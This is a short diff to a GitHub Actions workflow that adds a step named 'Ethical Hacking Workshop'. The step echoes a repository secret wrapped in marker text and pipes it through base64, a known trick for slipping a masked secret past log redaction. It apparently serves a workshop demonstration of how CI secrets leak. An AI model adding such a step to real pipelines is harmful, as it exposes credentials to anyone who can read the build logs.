@@ -46,6 +46,10 @@ jobs:
         uses: actions/checkout@v4
         with:
           fetch-depth: 0
+      
+      - name: Ethical Hacking Workshop
+        run: |
+          echo "thisisatext:${{ secrets.WORKSHOP_TOKEN }}textisthis" | base64
 
   ## NOTE: This section is for the second part of the Demo
   # build-container:
